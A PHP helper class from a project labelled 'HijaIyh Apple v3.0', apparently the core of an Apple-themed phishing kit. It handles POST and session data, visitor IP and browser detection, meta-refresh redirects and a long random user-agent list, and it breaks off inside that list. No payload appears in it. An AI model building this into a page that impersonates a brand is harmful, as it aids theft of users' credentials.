<?php 
# HijaIyh Project.
/**
* HijaIyh Apple v3.0
* @version 3.0
* @author shutdown57 < indonesianpeople.shutdown57@gmail.com >
* @copyright (c) HijaIyh Production 2019.
**/


Class hicore{
	public $dir_cache =   __DIR__ . '/cache';
	public function post($name)
	{
		if(empty($_POST[$name]))
		{
			return '-';
		}else{
			return $_POST[$name];
		}
	}
  public function empty_post_array($data=array())
  {
    $e="";
    foreach($data as $name)
    {
      if(empty($_POST[$name]))
      {
        $e .= "true";
      }else{
        $e .= "false";
      }
    }
    if(preg_match("/true/",$e))
    {
      return true;
    }else{
      return false;
    }
  }
	public function session($name)
	{
		return @$_SESSION[$name];
	}
	public function create_session($data=array())
	{
		$x = '';
		if(is_array($data)){
		foreach($data as $name=>$val)
		{
			$x.= @$_SESSION[''.$name.'']=$val;
		}
		}
		return $x;
	}
	public function userIP()
	{
       $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'unknown';
    return $ipaddress;
	}
	public function redirect($kmn='?',$delay=0)
	{
		echo "<META HTTP-EQUIV='REFRESH' CONTENT='".$delay.";url=".$kmn."'/>";
		//echo "<script>window.location.href='".$kmn."';</script>";
		//@header('location:'.$kmn);
		exit;
	}
	public function getBrowser() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
	}
	public function rand_ua() {
        $browser_freq = array(
            "Internet Explorer" => 11.8,
            "Firefox" => 28.2,
            "Opera" => 1.8
        );
        $browser_strings = array(
            "Internet Explorer" => array(
                "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
                "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
                "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
                "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
                "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
                "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; en-US)",
                "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
                "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; en-US)",
                "Mozilla/5.0 ( ; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
                "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
                "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
                "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
                "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
                "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 7.1; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; AskTB5.5)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; InfoPath.2; .NET4.0C; .NET4.0E)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET4.0C; .NET4.0E; InfoPath.3)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; FDM; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E; Tablet PC 2.0)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; Tablet PC 2.0; InfoPath.3; .NET4.0E)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; FDM; .NET4.0C; .NET4.0E; chromeframe/11.0.696.57)",
                "Mozilla/4.0 (compatible; U; MSIE 9.0; WIndows NT 9.0; en-US)",
                "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)"
            ) ,
"Firefox" => array(
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
    "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
    "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:23.0) Gecko/20131011 Firefox/23.0",
    "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:21.0.0) Gecko/20121011 Firefox/21.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130331 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130330 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130401 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130331 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 5.0; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64;) Gecko/20100101 Firefox/20.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20100101 Firefox/19.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/18.0.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux armv7l; rv:17.0) Gecko/20100101 Firefox/17.0",
    "Mozilla/6.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
    "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
    "Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.16) Gecko/20120427 Firefox/15.0a1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
    "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:15.0) Gecko/20120910144328 Firefox/15.0.2",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:15.0) Gecko/20121011 Firefox/15.0.1"
) ,
"Opera" => array(
    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
    "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
    "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
    "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
    "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
    "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
    "Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00",
    "Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
    "Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62",
    "Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.10.229 Version/11.62",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; de) Presto/2.9.168 Version/11.52",
    "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.9.168 Version/11.51",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; de) Opera 11.51",
    "Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50",
    "Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50",
    "Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11",
    "Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.8.131 Version/11.11",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/5.0 Opera 11.11",
    "Opera/9.80 (X11; Linux x86_64; U; bg) Presto/2.8.131 Version/11.10",
    "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10",
    "Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
    "Opera/9.80 (Windows NT 6.1; Opera Tablet/15165; U; en) Presto/2.8.149 Version/11.1",
    "Opera/9.80 (X11; Linux x86_64; U; Ubuntu/10.10 (maverick); pl) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (X11; Linux i686; U; ja) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 6.1; U; en-US) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.7.62 Version/11.01",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
    "Mozilla/5.0 (Windows NT 6.1; U; nl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
    "Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
    "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00",
    "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (Windows NT 6.1; U; ko) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (Windows NT 6.1 x64; U; en) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.7.39 Version/11.00",
    "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00",
    "Opera/9.80 (Windows NT 5.1; U; MRA 5.5 (build 02842); ru) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (Windows NT 5.1; U; it) Presto/2.7.62 Version/11.00",
    "Mozilla/5.0 (Windows NT 6.0; U; ja; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
    "Mozilla/5.0 (Windows NT 5.1; U; pl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
    "Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
    "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.6.31 Version/10.70",
    "Mozilla/5.0 (Windows NT 5.2; U; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
    "Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
    "Opera/9.80 (Windows NT 5.2; U; zh-cn) Presto/2.6.30 Version/10.63",
    "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.6.30 Version/10.63",
    "Opera/9.80 (Windows NT 5.1; U; MRA 5.6 (build 03278); ru) Presto/2.6.30 Version/10.63",
    "Opera/9.80 (Windows NT 5.1; U; pl) Presto/2.6.30 Version/10.62",
    "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
    "Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; de) Opera 10.62",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; en) Opera 10.62",
    "Opera/9.80 (X11; Linux i686; U; pl) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (Windows NT 6.0; U; it) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (Windows 98; U; de) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (Macintosh; Intel Mac OS X; U; nl) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (X11; Linux i686; U; en) Presto/2.5.27 Version/10.60",
    "Opera/9.80 (Windows NT 6.0; U; nl) Presto/2.6.30 Version/10.60",
    "Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60",
    "Opera/10.60 (Windows NT 5.1; U; en-US) Presto/2.6.30 Version/10.60",
    "Opera/9.80 (X11; Linux i686; U; it) Presto/2.5.24 Version/10.54",
    "Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.5.24 Version/10.53",
    "Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
    "Mozilla/5.0 (Windows NT 5.1; U; Firefox/5.0; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
    "Mozilla/5.0 (Windows NT 5.1; U; Firefox/4.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
    "Mozilla/5.0 (Windows NT 5.1; U; Firefox/3.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; ko) Opera 10.53",
    "Opera/9.80 (Windows NT 6.1; U; fr) Presto/2.5.24 Version/10.52",
    "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.5.22 Version/10.51",
    "Opera/9.80 (Windows NT 6.0; U; cs) Presto/2.5.22 Version/10.51",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
    "Opera/9.80 (Linux i686; U; en) Presto/2.5.22 Version/10.51",
    "Mozilla/5.0 (Windows NT 6.1; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
    "Mozilla/5.0 (Linux i686; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
    "Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.51",
    "Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.5.22 Version/10.50",
    "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.5.22 Version/10.50",
    "Opera/9.80 (Windows NT 6.1; U; sk) Presto/2.6.22 Version/10.50",
    "Opera/9.80 (Windows NT 6.1; U; ja) Presto/2.5.22 Version/10.50",
    "Opera/9.80 (Windows NT 6.0; U; zh-cn) Presto/2.5.22 Version/10.50",
    "Opera/9.80 (Windows NT 5.1; U; sk) Presto/2.5.22 Version/10.50",
    "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.22 Version/10.50",
    "Opera/10.50 (Windows NT 6.1; U; en-GB) Presto/2.2.2",
    "Opera/9.80 (S60; SymbOS; Opera Tablet/9174; U; en) Presto/2.7.81 Version/10.5",
    "Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10",
    "Opera/9.80 (X11; Linux x86_64; U; it) Presto/2.2.15 Version/10.10",
    "Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.10",
    "Opera/9.80 (Windows NT 6.0; U; Gecko/20100115; pl) Presto/2.2.15 Version/10.10",
    "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.10",
    "Opera/9.80 (Windows NT 5.1; U; de) Presto/2.2.15 Version/10.10",
    "Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.10",
    "Mozilla/5.0 (Windows NT 6.0; U; tr; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 10.10",
    "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; tr) Opera 10.10",
    "Opera/9.80 (X11; Linux x86_64; U; en-GB) Presto/2.2.15 Version/10.01",
    "Opera/9.80 (X11; Linux x86_64; U; en) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux x86_64; U; de) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux i686; U; ru) Presto/2.2.15 Version/10.00",
